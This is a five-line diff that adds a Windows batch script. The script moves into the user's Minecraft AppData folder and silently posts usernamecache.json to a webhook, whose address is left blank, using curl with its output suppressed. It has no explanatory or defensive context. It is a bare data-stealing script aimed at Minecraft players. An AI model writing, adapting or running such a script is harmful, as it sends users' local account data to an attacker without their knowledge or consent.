@@ -1,0 +1,5 @@
+set webhook=
+@echo off 
+cd C:\Users\%username%\AppData\Roaming\.minecraft
+curl --silent --output /dev/null -F l=@"usernamecache.json" %webhook%
+exit 
